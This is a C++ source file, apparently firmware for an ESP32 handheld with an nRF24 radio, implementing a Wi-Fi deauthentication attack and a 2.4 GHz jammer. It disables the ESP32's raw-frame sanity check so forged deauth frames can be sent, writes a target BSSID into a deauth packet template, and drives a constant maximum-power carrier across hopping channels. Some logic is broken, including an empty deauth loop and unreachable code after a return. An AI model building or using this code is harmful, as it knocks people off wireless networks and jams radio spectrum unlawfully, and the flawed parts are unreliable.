#include <TFT_eSPI.h>
#include "attack.h"
#include "packets.h"
#include "globals.h"
#include "rf24.h"
#include "Menu.h"
#include "display.h"
#include "wifi.h"
extern nrf24 nRF24;
extern display dis;
extern Menu* activem;
extern wifi Wifi;
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}
void attack::deauth() {
  deauthing = true;
  while(deauthing){

  }
}
uint8_t* attack::createDeauthPacket(uint8_t* bssid) {
  uint8_t* endPacket = deauthPacket;
  for (int i = 0; i < 6; i++) {
    endPacket[10 + i] = endPacket[16 + i] = bssid[i];
  }
  return endPacket;
}
void attack::nRF24Jammer() {
  nRF24Jamming = true;
  nRF24.rad.startConstCarrier(RF24_PA_MAX, 45);
  while (nRF24Jamming) {
    for (int j = 0; j < sizeof(hopping_channel); j++) {
      nRF24.changeChannel(hopping_channel[j]);
      if (activem->handleInput()) {
        break;
      }
    }
  }
}
void attack::setMode(int mode, bool status) {
  if (mode == 0) {
    deauthing = status;
  } else if (mode == 1) {
    nRF24Jamming = status;
  }
}
bool attack::getMode(int mode) {
  if (mode == 0) {
    return deauthing;
  } else if (mode == 1) {
    return nRF24Jamming;
    if(!mode)nRF24.rad.stopConstCarrier();
  }
}